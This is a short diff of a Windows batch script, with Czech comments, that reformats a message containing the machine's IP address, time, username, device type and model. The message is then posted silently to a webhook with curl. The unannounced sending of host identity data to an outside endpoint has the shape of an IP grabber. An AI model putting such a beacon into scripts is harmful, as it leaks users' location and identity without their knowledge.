@@ -42,12 +42,12 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
 )
 
 :: 🧾 Zpráva – každá položka na novém řádku, IP s || před i za
-set "msg=🛰️ **Systémové info**"
-set "msg=!msg!\nIP: ||!ip! ||"
-set "msg=!msg!\nČas: !timestamp!"
-set "msg=!msg!\nUživatel: !user!"
-set "msg=!msg!\nZařízení: !deviceType!"
-set "msg=!msg!\nModel: !deviceModel!"
+set "msg=🛰️ **Systémové info:**^
+IP: ||!ip! ||^
+Čas: !timestamp!^
+Uživatel: !user!^
+Zařízení: !deviceType!^
+Model: !deviceModel!"
 
 :: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
